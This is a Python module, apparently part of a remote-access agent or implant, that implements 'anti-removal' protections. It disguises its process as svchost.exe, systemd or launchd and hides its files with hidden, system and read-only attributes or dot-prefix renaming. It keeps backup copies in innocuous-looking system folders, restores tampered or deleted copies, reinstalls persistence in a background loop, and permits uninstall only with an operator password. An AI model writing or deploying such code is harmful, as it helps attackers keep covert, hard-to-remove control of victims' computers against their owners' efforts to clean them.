"""
Anti-Removal Protection Module

Provides advanced protection mechanisms to resist unauthorized removal attempts.
Includes process name spoofing, file attribute protection, persistence recreation,
file restoration from backups, tampering detection, and remote uninstall with password.

Requirements: 8.1, 8.2, 8.4, 8.5, 8.6, 8.7
"""

import os
import sys
import platform
import subprocess
import hashlib
import time
import threading
from typing import Optional, Dict, Any, List
from pathlib import Path
from dataclasses import dataclass


@dataclass
class TamperingDetectionResult:
    """
    Result of tampering detection check
    
    Attributes:
        tampering_detected: Whether tampering was detected
        affected_files: List of files that were tampered with
        restored_files: List of files that were restored
        error: Error message if detection failed
    """
    tampering_detected: bool
    affected_files: List[str]
    restored_files: List[str]
    error: Optional[str]


@dataclass
class UninstallResult:
    """
    Result of uninstall operation
    
    Attributes:
        success: Whether uninstall was successful
        removed_items: List of items removed
        error: Error message if uninstall failed
    """
    success: bool
    removed_items: List[str]
    error: Optional[str]


class AntiRemoval:
    """
    Anti-Removal Protection System
    
    Provides multiple layers of protection to resist unauthorized removal:
    - Process name spoofing to appear as legitimate system process
    - File attribute protection (hidden, system, read-only)
    - Persistence recreation when deleted
    - File restoration from backup copies
    - Tampering detection with file integrity checks
    - Remote uninstall with password validation
    
    Requirements: 8.1, 8.2, 8.4, 8.5, 8.6, 8.7
    """
    
    def __init__(self, agent_path: str, persistence_plugin=None, 
                 uninstall_password: Optional[str] = None):
        """
        Initialize anti-removal protection
        
        Args:
            agent_path: Path to the agent executable
            persistence_plugin: Reference to persistence plugin for recreation
            uninstall_password: Password required for remote uninstall
        
        Requirements: 8.1, 8.2, 8.5, 8.6
        """
        self.agent_path = agent_path
        self.agent_name = os.path.basename(agent_path)
        self.platform = platform.system()
        self.persistence_plugin = persistence_plugin
        self.uninstall_password = uninstall_password
        
        # File integrity tracking
        self.file_checksums: Dict[str, str] = {}
        self.monitored_files: List[str] = []
        
        # Monitoring state
        self.monitoring_active = False
        self.monitoring_thread: Optional[threading.Thread] = None
        
        # Backup locations (same as persistence plugin)
        self.backup_locations = self._get_backup_locations()
    
    def spoof_process_name(self, spoofed_name: str = None) -> bool:
        """
        Spoof process name to appear as legitimate system process
        
        On Windows: Uses SetConsoleTitleW to change window title
        On Linux: Modifies /proc/self/comm or uses prctl
        On macOS: Uses setproctitle if available
        
        Args:
            spoofed_name: Name to spoof (default: platform-specific system process)
        
        Returns:
            True if successful, False otherwise
        
        Requirement: 8.1
        """
        if spoofed_name is None:
            # Use platform-specific default names
            if self.platform == 'Windows':
                spoofed_name = 'svchost.exe'
            elif self.platform == 'Linux':
                spoofed_name = 'systemd'
            elif self.platform == 'Darwin':  # macOS
                spoofed_name = 'launchd'
            else:
                spoofed_name = 'system'
        
        try:
            if self.platform == 'Windows':
                # Change console window title
                import ctypes
                ctypes.windll.kernel32.SetConsoleTitleW(spoofed_name)
                return True
            
            elif self.platform == 'Linux':
                # Try using prctl (requires python-prctl package)
                try:
                    import prctl
                    prctl.set_name(spoofed_name)
                    return True
                except ImportError:
                    # Fallback: modify /proc/self/comm
                    try:
                        with open('/proc/self/comm', 'w') as f:
                            f.write(spoofed_name[:15])  # Max 15 chars
                        return True
                    except Exception:
                        return False
            
            elif self.platform == 'Darwin':  # macOS
                # Try using setproctitle
                try:
                    import setproctitle
                    setproctitle.setproctitle(spoofed_name)
                    return True
                except ImportError:
                    return False
            
            return False
        
        except Exception:
            return False
    
    def protect_file_attributes(self, file_path: str) -> bool:
        """
        Apply file protection attributes (hidden, system, read-only)
        
        Uses platform-specific APIs to set file attributes that make
        the file harder to detect and remove.
        
        Args:
            file_path: Path to file to protect
        
        Returns:
            True if successful, False otherwise
        
        Requirement: 8.2
        """
        if not os.path.exists(file_path):
            return False
        
        try:
            if self.platform == 'Windows':
                # Use attrib command to set hidden, system, read-only
                cmd = ['attrib', '+h', '+s', '+r', file_path]
                result = subprocess.run(
                    cmd,
                    capture_output=True,
                    timeout=10
                )
                return result.returncode == 0
            
            elif self.platform in ['Linux', 'Darwin']:
                # Set file as hidden (prefix with .) and read-only
                # Note: Can't truly set "system" attribute on Unix
                try:
                    # Make read-only
                    os.chmod(file_path, 0o444)
                    
                    # If not already hidden, rename with dot prefix
                    dir_name = os.path.dirname(file_path)
                    base_name = os.path.basename(file_path)
                    if not base_name.startswith('.'):
                        new_path = os.path.join(dir_name, '.' + base_name)
                        if not os.path.exists(new_path):
                            os.rename(file_path, new_path)
                    
                    return True
                except Exception:
                    return False
            
            return False
        
        except Exception:
            return False
    
    def recreate_persistence(self) -> bool:
        """
        Recreate persistence mechanisms if deleted
        
        Checks if persistence is installed and reinstalls if missing.
        Works with the persistence plugin to restore all mechanisms.
        
        Returns:
            True if persistence was recreated or already exists, False otherwise
        
        Requirement: 8.4
        """
        if self.persistence_plugin is None:
            return False
        
        try:
            # Check current persistence status
            status = self.persistence_plugin.check_persistence()
            
            # If no persistence methods are active, reinstall
            if not status.installed or len(status.active_methods) == 0:
                result = self.persistence_plugin.install_persistence(method='auto')
                return result.success
            
            # Persistence already exists
            return True
        
        except Exception:
            return False
    
    def restore_from_backup(self, target_path: str) -> bool:
        """
        Restore file from backup copies
        
        Searches backup locations for a copy of the file and restores it
        to the target location.
        
        Args:
            target_path: Path where file should be restored
        
        Returns:
            True if file was restored, False otherwise
        
        Requirement: 8.7
        """
        try:
            target_name = os.path.basename(target_path)
            
            # Search backup locations
            for backup_dir in self.backup_locations:
                backup_path = os.path.join(backup_dir, target_name)
                
                if os.path.exists(backup_path):
                    # Copy from backup to target
                    import shutil
                    shutil.copy2(backup_path, target_path)
                    
                    # Reapply protection attributes
                    self.protect_file_attributes(target_path)
                    
                    return True
            
            return False
        
        except Exception:
            return False
    
    def calculate_file_checksum(self, file_path: str) -> Optional[str]:
        """
        Calculate SHA256 checksum of a file
        
        Args:
            file_path: Path to file
        
        Returns:
            Hex digest of checksum, or None if error
        """
        try:
            sha256 = hashlib.sha256()
            
            with open(file_path, 'rb') as f:
                while True:
                    chunk = f.read(8192)
                    if not chunk:
                        break
                    sha256.update(chunk)
            
            return sha256.hexdigest()
        
        except Exception:
            return None
    
    def add_monitored_file(self, file_path: str) -> bool:
        """
        Add file to tampering detection monitoring
        
        Calculates and stores the file's checksum for later verification.
        
        Args:
            file_path: Path to file to monitor
        
        Returns:
            True if file was added, False otherwise
        """
        if not os.path.exists(file_path):
            return False
        
        checksum = self.calculate_file_checksum(file_path)
        if checksum is None:
            return False
        
        self.file_checksums[file_path] = checksum
        if file_path not in self.monitored_files:
            self.monitored_files.append(file_path)
        
        return True
    
    def detect_tampering(self) -> TamperingDetectionResult:
        """
        Detect tampering with monitored files
        
        Checks file integrity by comparing current checksums with stored values.
        Automatically restores tampered files from backup copies.
        
        Returns:
            TamperingDetectionResult with detection and restoration status
        
        Requirement: 8.7
        """
        affected_files = []
        restored_files = []
        
        try:
            for file_path in self.monitored_files:
                # Check if file exists
                if not os.path.exists(file_path):
                    affected_files.append(file_path)
                    
                    # Try to restore from backup
                    if self.restore_from_backup(file_path):
                        restored_files.append(file_path)
                        
                        # Update checksum
                        new_checksum = self.calculate_file_checksum(file_path)
                        if new_checksum:
                            self.file_checksums[file_path] = new_checksum
                    
                    continue
                
                # Check file integrity
                current_checksum = self.calculate_file_checksum(file_path)
                stored_checksum = self.file_checksums.get(file_path)
                
                if current_checksum != stored_checksum:
                    affected_files.append(file_path)
                    
                    # Try to restore from backup
                    if self.restore_from_backup(file_path):
                        restored_files.append(file_path)
                        
                        # Update checksum
                        new_checksum = self.calculate_file_checksum(file_path)
                        if new_checksum:
                            self.file_checksums[file_path] = new_checksum
            
            return TamperingDetectionResult(
                tampering_detected=len(affected_files) > 0,
                affected_files=affected_files,
                restored_files=restored_files,
                error=None
            )
        
        except Exception as e:
            return TamperingDetectionResult(
                tampering_detected=False,
                affected_files=[],
                restored_files=[],
                error=str(e)
            )
    
    def start_monitoring(self, check_interval: int = 30) -> bool:
        """
        Start continuous tampering detection monitoring
        
        Runs tampering detection in a background thread at regular intervals.
        Also checks and recreates persistence if needed.
        
        Args:
            check_interval: Seconds between checks (default: 30)
        
        Returns:
            True if monitoring started, False if already running
        """
        if self.monitoring_active:
            return False
        
        self.monitoring_active = True
        
        def monitoring_loop():
            while self.monitoring_active:
                # Check for tampering
                result = self.detect_tampering()
                
                if result.tampering_detected:
                    print(f"[ANTI-REMOVAL] Tampering detected: {len(result.affected_files)} files")
                    print(f"[ANTI-REMOVAL] Restored: {len(result.restored_files)} files")
                
                # Check and recreate persistence
                self.recreate_persistence()
                
                # Sleep before next check
                time.sleep(check_interval)
        
        self.monitoring_thread = threading.Thread(
            target=monitoring_loop,
            daemon=True,
            name="AntiRemovalMonitor"
        )
        self.monitoring_thread.start()
        
        return True
    
    def stop_monitoring(self) -> None:
        """
        Stop continuous tampering detection monitoring
        """
        self.monitoring_active = False
        
        if self.monitoring_thread and self.monitoring_thread.is_alive():
            self.monitoring_thread.join(timeout=5)
    
    def remote_uninstall(self, password: str) -> UninstallResult:
        """
        Perform remote uninstall with password validation
        
        Validates password, then removes all persistence mechanisms,
        backup copies, and the agent itself.
        
        Args:
            password: Password for uninstall authorization
        
        Returns:
            UninstallResult with operation status
        
        Requirements: 8.5, 8.6
        """
        removed_items = []
        
        # Validate password (Requirement 8.5)
        if self.uninstall_password is None:
            return UninstallResult(
                success=False,
                removed_items=[],
                error="No uninstall password configured"
            )
        
        if password != self.uninstall_password:
            # Log unauthorized uninstall attempt (Requirement 8.6)
            print(f"[ANTI-REMOVAL] Unauthorized uninstall attempt denied")
            return UninstallResult(
                success=False,
                removed_items=[],
                error="Invalid password"
            )
        
        try:
            # Stop monitoring
            self.stop_monitoring()
            
            # Remove persistence mechanisms
            if self.persistence_plugin:
                if self.persistence_plugin.remove_persistence():
                    removed_items.append("persistence_mechanisms")
            
            # Remove backup copies
            for backup_dir in self.backup_locations:
                backup_path = os.path.join(backup_dir, self.agent_name)
                
                if os.path.exists(backup_path):
                    try:
                        # Remove attributes first on Windows
                        if self.platform == 'Windows':
                            subprocess.run(
                                ['attrib', '-h', '-s', '-r', backup_path],
                                capture_output=True,
                                timeout=10
                            )
                        
                        os.remove(backup_path)
                        removed_items.append(f"backup:{backup_path}")
                    except Exception:
                        pass
            
            # Remove monitored files
            for file_path in self.monitored_files:
                if os.path.exists(file_path) and file_path != self.agent_path:
                    try:
                        # Remove attributes first on Windows
                        if self.platform == 'Windows':
                            subprocess.run(
                                ['attrib', '-h', '-s', '-r', file_path],
                                capture_output=True,
                                timeout=10
                            )
                        
                        os.remove(file_path)
                        removed_items.append(f"monitored:{file_path}")
                    except Exception:
                        pass
            
            # Schedule agent deletion (can't delete self while running)
            # On Windows, use a batch script
            # On Unix, use a shell script
            if self.platform == 'Windows':
                batch_script = f"""
@echo off
timeout /t 2 /nobreak > nul
del /f /q "{self.agent_path}"
del /f /q "%~f0"
"""
                script_path = os.path.join(os.environ.get('TEMP', ''), 'cleanup.bat')
                with open(script_path, 'w') as f:
                    f.write(batch_script)
                
                subprocess.Popen(
                    ['cmd', '/c', script_path],
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
            else:
                shell_script = f"""#!/bin/sh
sleep 2
rm -f "{self.agent_path}"
rm -f "$0"
"""
                script_path = '/tmp/cleanup.sh'
                with open(script_path, 'w') as f:
                    f.write(shell_script)
                
                os.chmod(script_path, 0o755)
                subprocess.Popen(['/bin/sh', script_path])
            
            removed_items.append("agent_executable")
            
            return UninstallResult(
                success=True,
                removed_items=removed_items,
                error=None
            )
        
        except Exception as e:
            return UninstallResult(
                success=False,
                removed_items=removed_items,
                error=str(e)
            )
    
    def _get_backup_locations(self) -> List[str]:
        """
        Get platform-specific backup directory locations
        
        Returns:
            List of backup directory paths
        """
        if self.platform == 'Windows':
            return [
                os.path.join(os.environ.get('APPDATA', ''), 'Microsoft', 'Windows'),
                os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Temp'),
                os.path.join(os.environ.get('TEMP', ''), 'System')
            ]
        elif self.platform == 'Linux':
            return [
                os.path.expanduser('~/.config'),
                os.path.expanduser('~/.local/share'),
                '/tmp/.system'
            ]
        elif self.platform == 'Darwin':  # macOS
            return [
                os.path.expanduser('~/Library/Application Support'),
                os.path.expanduser('~/Library/Caches'),
                '/tmp/.system'
            ]
        else:
            return []


def create_anti_removal(agent_path: str, persistence_plugin=None,
                       uninstall_password: Optional[str] = None) -> AntiRemoval:
    """
    Factory function to create an AntiRemoval instance
    
    Args:
        agent_path: Path to the agent executable
        persistence_plugin: Reference to persistence plugin
        uninstall_password: Password for remote uninstall
    
    Returns:
        Configured AntiRemoval instance
    """
    return AntiRemoval(
        agent_path=agent_path,
        persistence_plugin=persistence_plugin,
        uninstall_password=uninstall_password
    )
